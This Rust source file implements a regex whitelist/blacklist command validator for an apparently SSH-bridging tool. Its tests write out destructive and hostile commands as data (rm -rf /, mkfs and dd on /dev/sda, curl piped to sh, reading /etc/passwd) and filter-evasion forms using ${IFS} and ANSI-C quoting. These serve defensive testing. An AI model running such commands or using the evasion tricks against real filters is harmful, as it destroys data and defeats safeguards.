//! Command validation using Strategy pattern

use std::sync::RwLock;

use regex::Regex;
use tracing::{error, info};

use crate::config::{SecurityConfig, SecurityMode};
use crate::error::{BridgeError, Result};

/// Compiled regex patterns for validation
struct CompiledPatterns {
    mode: SecurityMode,
    whitelist: Vec<Regex>,
    blacklist: Vec<Regex>,
}

impl CompiledPatterns {
    fn compile(config: &SecurityConfig) -> Self {
        let mut whitelist = Vec::new();
        for pattern in &config.whitelist {
            match Regex::new(pattern) {
                Ok(regex) => whitelist.push(regex),
                Err(e) => error!(pattern = %pattern, error = %e, "Invalid whitelist regex pattern"),
            }
        }

        let mut blacklist = Vec::new();
        for pattern in &config.blacklist {
            match Regex::new(pattern) {
                Ok(regex) => blacklist.push(regex),
                Err(e) => error!(pattern = %pattern, error = %e, "Invalid blacklist regex pattern"),
            }
        }

        Self {
            mode: config.mode,
            whitelist,
            blacklist,
        }
    }
}

/// Normalize a command before regex blacklist match so shell-side
/// whitespace expansions do not evade patterns that expect literal
/// whitespace between tokens.
///
/// Collapses:
/// - `${IFS}` and `$IFS` -> single space
/// - `$'\t'`, `$'\n'`, `$' '` (ANSI-C-quoted whitespace) -> single space
/// - line continuation `\<NL>` -> single space
///
/// The whitelist match continues to run against the raw input so
/// strict-mode whitelisting still requires byte-for-byte equality.
fn normalize_for_blacklist_match(input: &str) -> String {
    let mut s = input.replace("\\\n", " ");
    s = s.replace("${IFS}", " ").replace("$IFS", " ");
    s = s
        .replace("$'\\t'", " ")
        .replace("$'\\n'", " ")
        .replace("$' '", " ");
    s
}

/// Compiled security rules for command validation
///
/// Supports hot-reload of patterns via the `reload()` method.
///
/// # Examples
///
/// ```
/// use mcp_ssh_bridge::config::{SecurityConfig, SecurityMode, SanitizeConfig};
/// use mcp_ssh_bridge::security::CommandValidator;
///
/// // Permissive mode: allow everything except blacklisted patterns
/// let config = SecurityConfig {
///     mode: SecurityMode::Permissive,
///     blacklist: vec![r"rm\s+-rf".to_string()],
///     ..Default::default()
/// };
/// let validator = CommandValidator::new(&config);
/// assert!(validator.validate("ls -la").is_ok());
/// assert!(validator.validate("rm -rf /").is_err());
///
/// // Strict mode: only whitelisted commands are allowed
/// let strict = SecurityConfig {
///     mode: SecurityMode::Strict,
///     whitelist: vec![r"^ls\b".to_string(), r"^pwd$".to_string()],
///     ..Default::default()
/// };
/// let strict_validator = CommandValidator::new(&strict);
/// assert!(strict_validator.validate("ls -la").is_ok());
/// assert!(strict_validator.validate("cat /etc/passwd").is_err());
/// ```
pub struct CommandValidator {
    patterns: RwLock<CompiledPatterns>,
}

impl CommandValidator {
    /// Create a new validator with pre-compiled regex patterns
    #[must_use]
    pub fn new(config: &SecurityConfig) -> Self {
        Self {
            patterns: RwLock::new(CompiledPatterns::compile(config)),
        }
    }

    /// Reload the validator with new security configuration
    ///
    /// This allows hot-reloading of whitelist/blacklist patterns without
    /// restarting the server.
    pub fn reload(&self, config: &SecurityConfig) {
        let new_patterns = CompiledPatterns::compile(config);
        match self.patterns.write() {
            Ok(mut guard) => {
                *guard = new_patterns;
                info!(
                    mode = ?config.mode,
                    whitelist_count = config.whitelist.len(),
                    blacklist_count = config.blacklist.len(),
                    "Security rules reloaded"
                );
            }
            Err(e) => {
                error!(error = %e, "Failed to acquire write lock for security rules reload");
            }
        }
    }

    /// Validate a command against security rules
    ///
    /// # Errors
    ///
    /// Returns an error if the command matches a blacklist pattern or is not in the
    /// whitelist when security mode is strict.
    ///
    /// # Panics
    ///
    /// Panics if the internal lock is poisoned (indicates a previous panic).
    #[expect(clippy::significant_drop_tightening)]
    pub fn validate(&self, command: &str) -> Result<()> {
        let raw = command.trim();

        // Reject empty commands
        if raw.is_empty() {
            return Err(BridgeError::CommandDenied {
                reason: "Command cannot be empty".to_string(),
            });
        }

        // Normalize shell-side whitespace expansions (${IFS}, $'\t', \<NL>, ...)
        // so default blacklist regexes that expect literal whitespace between
        // tokens cannot be bypassed via shell expansion. Whitelist still matches
        // the raw input below so strict-mode equality semantics are preserved.
        let normalized_for_match = normalize_for_blacklist_match(raw);

        // Acquire read lock for patterns (recover from poisoned lock if needed)
        let patterns = self
            .patterns
            .read()
            .unwrap_or_else(std::sync::PoisonError::into_inner);

        // Check blacklist first (always applies)
        for pattern in &patterns.blacklist {
            if pattern.is_match(&normalized_for_match) {
                return Err(BridgeError::CommandDenied {
                    reason: format!("Command matches blacklist pattern: {pattern}"),
                });
            }
        }

        // In strict/standard mode, check whitelist (against raw, not normalized)
        if matches!(patterns.mode, SecurityMode::Strict | SecurityMode::Standard) {
            let allowed = patterns.whitelist.iter().any(|p| p.is_match(raw));
            if !allowed {
                return Err(BridgeError::CommandDenied {
                    reason: format!(
                        "Command not in whitelist ({} mode)",
                        match patterns.mode {
                            SecurityMode::Strict => "strict",
                            SecurityMode::Standard => "standard",
                            SecurityMode::Permissive => "permissive",
                        }
                    ),
                });
            }
        }

        Ok(())
    }

    /// Validate a command from a trusted built-in tool handler
    ///
    /// Only checks the blacklist, skips whitelist regardless of mode.
    /// Used by specialized tool handlers that build commands internally
    /// via trusted domain command builders (docker, kubernetes, systemd, etc.).
    ///
    /// # Errors
    ///
    /// Returns an error if the command matches a blacklist pattern or is empty.
    #[expect(clippy::significant_drop_tightening)]
    pub fn validate_builtin(&self, command: &str) -> Result<()> {
        let raw = command.trim();

        if raw.is_empty() {
            return Err(BridgeError::CommandDenied {
                reason: "Command cannot be empty".to_string(),
            });
        }

        // Same shell-expansion normalization as validate(); the blacklist is
        // the only gate for builtin handlers, so the bypass surface is here.
        let normalized_for_match = normalize_for_blacklist_match(raw);

        let patterns = self
            .patterns
            .read()
            .unwrap_or_else(std::sync::PoisonError::into_inner);

        // Check blacklist (always applies, even for builtin tools)
        for pattern in &patterns.blacklist {
            if pattern.is_match(&normalized_for_match) {
                return Err(BridgeError::CommandDenied {
                    reason: format!("Command matches blacklist pattern: {pattern}"),
                });
            }
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_config(
        mode: SecurityMode,
        whitelist: Vec<&str>,
        blacklist: Vec<&str>,
    ) -> SecurityConfig {
        SecurityConfig {
            mode,
            whitelist: whitelist.into_iter().map(String::from).collect(),
            blacklist: blacklist.into_iter().map(String::from).collect(),
            sanitize_patterns: vec![],
            sanitize: crate::config::SanitizeConfig::default(),
            ..SecurityConfig::default()
        }
    }

    #[test]
    fn test_blacklist_blocks_dangerous_commands() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![r"rm\s+-rf\s+/"]);
        let validator = CommandValidator::new(&config);

        assert!(validator.validate("rm -rf /").is_err());
        assert!(validator.validate("ls -la").is_ok());
    }

    #[test]
    fn test_whitelist_in_strict_mode() {
        let config = make_config(SecurityMode::Strict, vec![r"^ls\b", r"^cat\b"], vec![]);
        let validator = CommandValidator::new(&config);

        assert!(validator.validate("ls -la").is_ok());
        assert!(validator.validate("cat /etc/hosts").is_ok());
        assert!(validator.validate("rm file.txt").is_err());
    }

    #[test]
    fn test_permissive_mode_allows_unlisted() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![r"rm\s+-rf"]);
        let validator = CommandValidator::new(&config);

        assert!(validator.validate("rm file.txt").is_ok());
        assert!(validator.validate("rm -rf /tmp").is_err());
    }

    #[test]
    fn test_blacklist_overrides_whitelist() {
        let config = make_config(
            SecurityMode::Strict,
            vec![r"^rm\b"],    // Whitelist rm
            vec![r"rm\s+-rf"], // But blacklist rm -rf
        );
        let validator = CommandValidator::new(&config);

        assert!(validator.validate("rm file.txt").is_ok());
        assert!(validator.validate("rm -rf /").is_err());
    }

    #[test]
    fn test_invalid_whitelist_regex_is_skipped() {
        // Invalid regex patterns should be skipped (logged but not crash)
        let config = make_config(
            SecurityMode::Strict,
            vec![r"^ls\b", r"[invalid(regex", r"^cat\b"], // Middle one is invalid
            vec![],
        );
        let validator = CommandValidator::new(&config);

        // Valid patterns should still work
        assert!(validator.validate("ls -la").is_ok());
        assert!(validator.validate("cat file.txt").is_ok());
        // Unlisted commands should be denied in strict mode
        assert!(validator.validate("echo hello").is_err());
    }

    #[test]
    fn test_invalid_blacklist_regex_is_skipped() {
        // Invalid regex patterns should be skipped (logged but not crash)
        let config = make_config(
            SecurityMode::Permissive,
            vec![],
            vec![r"rm\s+-rf", r"[invalid(regex", r"chmod\s+777"], // Middle one is invalid
        );
        let validator = CommandValidator::new(&config);

        // Valid patterns should still work
        assert!(validator.validate("rm -rf /").is_err());
        assert!(validator.validate("chmod 777 /tmp").is_err());
        // Other commands should be allowed in permissive mode
        assert!(validator.validate("ls -la").is_ok());
    }

    #[test]
    fn test_empty_whitelist_strict_mode_denies_all() {
        let config = make_config(SecurityMode::Strict, vec![], vec![]);
        let validator = CommandValidator::new(&config);

        // Empty whitelist in strict mode denies everything
        assert!(validator.validate("ls").is_err());
        assert!(validator.validate("pwd").is_err());
        assert!(validator.validate("echo hello").is_err());
    }

    #[test]
    fn test_empty_blacklist_permissive_mode_allows_all() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![]);
        let validator = CommandValidator::new(&config);

        // Empty blacklist in permissive mode allows everything
        assert!(validator.validate("ls").is_ok());
        assert!(validator.validate("rm -rf /").is_ok());
        assert!(validator.validate("anything goes").is_ok());
    }

    #[test]
    fn test_command_trimming() {
        let config = make_config(SecurityMode::Strict, vec![r"^ls\b"], vec![]);
        let validator = CommandValidator::new(&config);

        // Commands should be trimmed before validation
        assert!(validator.validate("  ls -la  ").is_ok());
        assert!(validator.validate("\tls\n").is_ok());
    }

    #[test]
    fn test_error_message_contains_pattern() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![r"dangerous_cmd"]);
        let validator = CommandValidator::new(&config);

        let result = validator.validate("dangerous_cmd");
        assert!(result.is_err());

        if let Err(BridgeError::CommandDenied { reason }) = result {
            assert!(reason.contains("blacklist"));
            assert!(reason.contains("dangerous_cmd"));
        } else {
            panic!("Expected CommandDenied error");
        }
    }

    #[test]
    fn test_strict_mode_error_message() {
        let config = make_config(SecurityMode::Strict, vec![r"^allowed$"], vec![]);
        let validator = CommandValidator::new(&config);

        let result = validator.validate("not_allowed");
        assert!(result.is_err());

        if let Err(BridgeError::CommandDenied { reason }) = result {
            assert!(reason.contains("strict mode"));
        } else {
            panic!("Expected CommandDenied error");
        }
    }

    #[test]
    fn test_multiple_whitelist_patterns() {
        let config = make_config(
            SecurityMode::Strict,
            vec![r"^ls\b", r"^pwd$", r"^whoami$", r"^date$"],
            vec![],
        );
        let validator = CommandValidator::new(&config);

        assert!(validator.validate("ls").is_ok());
        assert!(validator.validate("ls -la").is_ok());
        assert!(validator.validate("pwd").is_ok());
        assert!(validator.validate("whoami").is_ok());
        assert!(validator.validate("date").is_ok());
        assert!(validator.validate("id").is_err());
    }

    #[test]
    fn test_multiple_blacklist_patterns() {
        let config = make_config(
            SecurityMode::Permissive,
            vec![],
            vec![r"rm\s+-rf", r"mkfs\.", r"dd\s+if=", r">\s*/dev/"],
        );
        let validator = CommandValidator::new(&config);

        assert!(validator.validate("rm -rf /").is_err());
        assert!(validator.validate("mkfs.ext4 /dev/sda").is_err());
        assert!(validator.validate("dd if=/dev/zero").is_err());
        assert!(validator.validate("> /dev/sda").is_err());
        assert!(validator.validate("cat file.txt").is_ok());
    }

    #[test]
    fn test_empty_command_denied() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![]);
        let validator = CommandValidator::new(&config);

        assert!(validator.validate("").is_err());
        assert!(validator.validate("   ").is_err());
        assert!(validator.validate("\t\n").is_err());
    }

    #[test]
    fn test_blacklist_rm_variants() {
        let config = make_config(
            SecurityMode::Permissive,
            vec![],
            vec![r"rm\s+(-[a-zA-Z]*r|--(recursive|force))"],
        );
        let validator = CommandValidator::new(&config);

        // All dangerous rm variants should be blocked
        assert!(validator.validate("rm -rf /").is_err());
        assert!(validator.validate("rm -r /tmp").is_err());
        assert!(validator.validate("rm -fr /").is_err());
        assert!(validator.validate("rm --recursive /").is_err());
        assert!(validator.validate("rm --force /tmp").is_err());
        assert!(validator.validate("rm  -rf  /").is_err());

        // Safe rm without -r should pass
        assert!(validator.validate("rm file.txt").is_ok());
        assert!(validator.validate("rm -f file.txt").is_ok());
    }

    // ============== Reload Tests ==============

    #[test]
    fn test_reload_changes_mode() {
        let initial_config = make_config(SecurityMode::Strict, vec![r"^ls$"], vec![]);
        let validator = CommandValidator::new(&initial_config);

        // Initially, only "ls" is allowed
        assert!(validator.validate("ls").is_ok());
        assert!(validator.validate("pwd").is_err());

        // Reload to permissive mode
        let new_config = make_config(SecurityMode::Permissive, vec![], vec![]);
        validator.reload(&new_config);

        // Now everything should be allowed
        assert!(validator.validate("ls").is_ok());
        assert!(validator.validate("pwd").is_ok());
    }

    #[test]
    fn test_reload_adds_patterns() {
        let initial_config = make_config(SecurityMode::Permissive, vec![], vec![]);
        let validator = CommandValidator::new(&initial_config);

        // Initially, rm -rf is allowed
        assert!(validator.validate("rm -rf /").is_ok());

        // Reload with blacklist
        let new_config = make_config(SecurityMode::Permissive, vec![], vec![r"rm\s+-rf"]);
        validator.reload(&new_config);

        // Now rm -rf is blocked
        assert!(validator.validate("rm -rf /").is_err());
    }

    #[test]
    fn test_reload_removes_patterns() {
        let initial_config = make_config(SecurityMode::Permissive, vec![], vec![r"rm\s+-rf"]);
        let validator = CommandValidator::new(&initial_config);

        // Initially blocked
        assert!(validator.validate("rm -rf /").is_err());

        // Reload without blacklist
        let new_config = make_config(SecurityMode::Permissive, vec![], vec![]);
        validator.reload(&new_config);

        // Now allowed
        assert!(validator.validate("rm -rf /").is_ok());
    }

    #[test]
    fn test_reload_with_invalid_patterns() {
        let initial_config = make_config(SecurityMode::Strict, vec![r"^ls$"], vec![]);
        let validator = CommandValidator::new(&initial_config);

        // Reload with some invalid patterns
        let new_config = make_config(
            SecurityMode::Strict,
            vec![r"^ls$", r"[invalid(regex", r"^pwd$"],
            vec![],
        );
        validator.reload(&new_config);

        // Valid patterns should still work
        assert!(validator.validate("ls").is_ok());
        assert!(validator.validate("pwd").is_ok());
    }

    // ============== Unicode Tests ==============

    #[test]
    fn test_unicode_in_command() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![]);
        let validator = CommandValidator::new(&config);

        assert!(validator.validate("echo 日本語").is_ok());
        assert!(validator.validate("echo 🎉").is_ok());
        assert!(validator.validate("echo مرحبا").is_ok());
    }

    #[test]
    fn test_unicode_in_patterns() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![r"危険"]);
        let validator = CommandValidator::new(&config);

        assert!(validator.validate("echo 危険なコマンド").is_err());
        assert!(validator.validate("echo 安全なコマンド").is_ok());
    }

    // ============== Edge Case Tests ==============

    #[test]
    fn test_very_long_command() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![]);
        let validator = CommandValidator::new(&config);

        let long_cmd = "echo ".to_string() + &"a".repeat(10000);
        assert!(validator.validate(&long_cmd).is_ok());
    }

    #[test]
    fn test_command_with_newlines() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![r"rm\s+-rf"]);
        let validator = CommandValidator::new(&config);

        // Newlines in command shouldn't bypass blacklist
        assert!(validator.validate("rm -rf /").is_err());
    }

    #[test]
    fn test_command_with_null_bytes() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![]);
        let validator = CommandValidator::new(&config);

        // Commands with null bytes should still work
        let cmd = "echo hello\0world";
        assert!(validator.validate(cmd).is_ok());
    }

    #[test]
    fn test_case_sensitivity() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![r"rm\s+-rf"]);
        let validator = CommandValidator::new(&config);

        // Regex is case-sensitive by default
        assert!(validator.validate("rm -rf /").is_err());
        assert!(validator.validate("RM -RF /").is_ok()); // Uppercase bypasses
    }

    #[test]
    fn test_case_insensitive_pattern() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![r"(?i)rm\s+-rf"]);
        let validator = CommandValidator::new(&config);

        // Case-insensitive pattern
        assert!(validator.validate("rm -rf /").is_err());
        assert!(validator.validate("RM -RF /").is_err());
        assert!(validator.validate("Rm -Rf /").is_err());
    }

    #[test]
    fn test_special_regex_chars_in_command() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![r"\$\(.*\)"]);
        let validator = CommandValidator::new(&config);

        // Command substitution should be blocked
        assert!(validator.validate("echo $(whoami)").is_err());
        assert!(validator.validate("echo hello").is_ok());
    }

    #[test]
    fn test_pipe_commands() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![r"\|\s*sh\b"]);
        let validator = CommandValidator::new(&config);

        // Piping to sh should be blocked
        assert!(validator.validate("curl example.com | sh").is_err());
        assert!(validator.validate("cat file | grep pattern").is_ok());
    }

    #[test]
    fn test_semicolon_chaining() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![r"rm\s+-rf"]);
        let validator = CommandValidator::new(&config);

        // Semicolon chaining with dangerous command
        assert!(validator.validate("ls; rm -rf /").is_err());
    }

    #[test]
    fn test_backtick_substitution() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![r"`.*`"]);
        let validator = CommandValidator::new(&config);

        // Backtick substitution should be blocked
        assert!(validator.validate("echo `whoami`").is_err());
        assert!(validator.validate("echo hello").is_ok());
    }

    #[test]
    fn test_empty_command_error_message() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![]);
        let validator = CommandValidator::new(&config);

        let result = validator.validate("");
        if let Err(BridgeError::CommandDenied { reason }) = result {
            assert!(reason.contains("empty"));
        } else {
            panic!("Expected CommandDenied error");
        }
    }

    #[test]
    fn test_whitelist_exact_match() {
        let config = make_config(SecurityMode::Strict, vec![r"^ls$"], vec![]);
        let validator = CommandValidator::new(&config);

        // Exact match only
        assert!(validator.validate("ls").is_ok());
        assert!(validator.validate("ls -la").is_err());
        assert!(validator.validate("lsblk").is_err());
    }

    #[test]
    fn test_whitelist_prefix_match() {
        let config = make_config(SecurityMode::Strict, vec![r"^ls\b"], vec![]);
        let validator = CommandValidator::new(&config);

        // Prefix match with word boundary
        assert!(validator.validate("ls").is_ok());
        assert!(validator.validate("ls -la").is_ok());
        assert!(validator.validate("lsblk").is_err()); // Different command
    }

    #[test]
    fn test_concurrent_validation() {
        use std::sync::Arc;
        use std::thread;

        let config = make_config(SecurityMode::Permissive, vec![], vec![r"dangerous"]);
        let validator = Arc::new(CommandValidator::new(&config));

        let handles: Vec<_> = (0..10)
            .map(|_| {
                let v = Arc::clone(&validator);
                thread::spawn(move || {
                    for _ in 0..100 {
                        assert!(v.validate("safe command").is_ok());
                        assert!(v.validate("dangerous").is_err());
                    }
                })
            })
            .collect();

        for handle in handles {
            handle.join().unwrap();
        }
    }

    // =========================================================================
    // validate_builtin() tests
    // =========================================================================

    #[test]
    fn test_validate_builtin_skips_whitelist_in_strict_mode() {
        let config = make_config(SecurityMode::Strict, vec![r"^ls$"], vec![]);
        let validator = CommandValidator::new(&config);

        // validate() denies non-whitelisted command in strict mode
        assert!(validator.validate("docker ps").is_err());
        // validate_builtin() allows it (no whitelist check)
        assert!(validator.validate_builtin("docker ps").is_ok());
    }

    #[test]
    fn test_validate_builtin_skips_whitelist_in_standard_mode() {
        let config = make_config(SecurityMode::Standard, vec![r"^ls$"], vec![]);
        let validator = CommandValidator::new(&config);

        // validate() denies non-whitelisted command in standard mode
        assert!(validator.validate("systemctl status nginx").is_err());
        // validate_builtin() allows it
        assert!(validator.validate_builtin("systemctl status nginx").is_ok());
    }

    #[test]
    fn test_validate_builtin_still_checks_blacklist() {
        let config = make_config(SecurityMode::Standard, vec![], vec![r"(?i)rm\s+-rf"]);
        let validator = CommandValidator::new(&config);

        // Blacklist blocks even for builtin
        assert!(validator.validate_builtin("rm -rf /").is_err());
        assert!(validator.validate_builtin("RM -RF /tmp").is_err());
        // Non-blacklisted command passes
        assert!(validator.validate_builtin("docker ps").is_ok());
    }

    #[test]
    fn test_validate_builtin_empty_command() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![]);
        let validator = CommandValidator::new(&config);

        assert!(validator.validate_builtin("").is_err());
        assert!(validator.validate_builtin("  ").is_err());
    }

    #[test]
    fn test_validate_builtin_in_permissive_mode() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![r"dangerous"]);
        let validator = CommandValidator::new(&config);

        // In permissive mode, validate and validate_builtin behave the same
        assert!(validator.validate_builtin("safe command").is_ok());
        assert!(validator.validate_builtin("dangerous").is_err());
    }

    // =========================================================================
    // Standard mode tests
    // =========================================================================

    #[test]
    fn test_standard_mode_validate_checks_whitelist() {
        let config = make_config(SecurityMode::Standard, vec![r"^ls\b", r"^cat\b"], vec![]);
        let validator = CommandValidator::new(&config);

        // validate() in standard mode checks whitelist (same as strict for raw exec)
        assert!(validator.validate("ls -la").is_ok());
        assert!(validator.validate("cat /etc/hosts").is_ok());
        assert!(validator.validate("rm file.txt").is_err());
    }

    #[test]
    fn test_standard_mode_empty_whitelist_blocks_raw_exec() {
        let config = make_config(SecurityMode::Standard, vec![], vec![]);
        let validator = CommandValidator::new(&config);

        // With empty whitelist, raw validate() blocks all commands
        assert!(validator.validate("ls").is_err());
        // But builtin tools still work
        assert!(validator.validate_builtin("ls").is_ok());
    }

    #[test]
    fn test_standard_mode_blacklist_overrides_whitelist() {
        let config = make_config(SecurityMode::Standard, vec![r"^rm\b"], vec![r"rm\s+-rf"]);
        let validator = CommandValidator::new(&config);

        // rm is whitelisted but rm -rf is blacklisted
        assert!(validator.validate("rm file.txt").is_ok());
        assert!(validator.validate("rm -rf /").is_err());
        // Same for builtin
        assert!(validator.validate_builtin("rm file.txt").is_ok());
        assert!(validator.validate_builtin("rm -rf /").is_err());
    }

    #[test]
    fn test_reload_with_invalid_regex_preserves_valid_patterns() {
        // Start with a valid whitelist
        let config = make_config(SecurityMode::Strict, vec![r"^ls\b"], vec![]);
        let validator = CommandValidator::new(&config);
        assert!(validator.validate("ls -la").is_ok());

        // Reload with a config that has one invalid regex pattern
        // The invalid pattern should be skipped, but other patterns should work
        let new_config = SecurityConfig {
            mode: SecurityMode::Strict,
            whitelist: vec![r"^cat\b".to_string(), r"[invalid".to_string()],
            blacklist: vec![],
            sanitize_patterns: vec![],
            ..SecurityConfig::default()
        };
        validator.reload(&new_config);

        // After reload, "ls" should be denied (old whitelist replaced)
        assert!(validator.validate("ls -la").is_err());
        // "cat" should be allowed (valid pattern in new config)
        assert!(validator.validate("cat /etc/hosts").is_ok());
    }

    #[test]
    fn test_whitespace_only_command_rejected() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![]);
        let validator = CommandValidator::new(&config);

        assert!(validator.validate("   ").is_err());
        assert!(validator.validate("\t\n").is_err());
        assert!(validator.validate("  \t  \n  ").is_err());
    }

    #[test]
    fn test_very_long_command_handling() {
        let config = make_config(SecurityMode::Permissive, vec![], vec![]);
        let validator = CommandValidator::new(&config);

        // 100K character command should not crash or hang
        let long_command = format!("echo {}", "a".repeat(100_000));
        let result = validator.validate(&long_command);
        // In permissive mode with no blacklist, this should succeed
        assert!(result.is_ok());
    }

    // =========================================================================
    // Vuln 10 — shell-aware normalization for blacklist match
    // =========================================================================

    #[test]
    fn validate_blocks_ifs_substitution() {
        let cfg = SecurityConfig {
            mode: SecurityMode::Permissive,
            ..SecurityConfig::default()
        };
        let v = CommandValidator::new(&cfg);
        assert!(
            v.validate("rm${IFS}-rf${IFS}/").is_err(),
            "rm${{IFS}}-rf${{IFS}}/ must be blocked like 'rm -rf /'"
        );
    }

    #[test]
    fn validate_blocks_dollar_ifs_no_braces() {
        let cfg = SecurityConfig {
            mode: SecurityMode::Permissive,
            ..SecurityConfig::default()
        };
        let v = CommandValidator::new(&cfg);
        assert!(v.validate("rm $IFS-rf $IFS/").is_err());
    }

    #[test]
    fn validate_blocks_ansi_c_quoted_whitespace() {
        let cfg = SecurityConfig {
            mode: SecurityMode::Permissive,
            ..SecurityConfig::default()
        };
        let v = CommandValidator::new(&cfg);
        assert!(v.validate(r"rm$'\t'-rf$'\t'/").is_err());
    }

    #[test]
    fn validate_blocks_line_continuation() {
        let cfg = SecurityConfig {
            mode: SecurityMode::Permissive,
            ..SecurityConfig::default()
        };
        let v = CommandValidator::new(&cfg);
        assert!(v.validate("rm \\\n-rf /").is_err());
    }

    #[test]
    fn validate_passes_clean_safe_command_in_permissive() {
        let cfg = SecurityConfig {
            mode: SecurityMode::Permissive,
            ..SecurityConfig::default()
        };
        let v = CommandValidator::new(&cfg);
        assert!(v.validate("ls -la /tmp").is_ok());
    }

    #[test]
    fn test_concurrent_validate_during_reload() {
        use std::sync::Arc;
        use std::thread;

        let config = make_config(SecurityMode::Permissive, vec![], vec![r"rm\s+-rf"]);
        let validator = Arc::new(CommandValidator::new(&config));

        // Launch 100 concurrent validations while doing a reload
        let mut handles = Vec::new();

        for _ in 0..50 {
            let v = Arc::clone(&validator);
            handles.push(thread::spawn(move || {
                // These should always succeed (permissive mode, not blacklisted)
                v.validate("ls -la").is_ok()
            }));
        }

        // Reload mid-flight
        validator.reload(&config);

        for _ in 0..50 {
            let v = Arc::clone(&validator);
            handles.push(thread::spawn(move || {
                // Blacklisted command should always fail
                v.validate("rm -rf /").is_err()
            }));
        }

        for handle in handles {
            assert!(
                handle.join().unwrap(),
                "Concurrent validation returned unexpected result"
            );
        }
    }
}
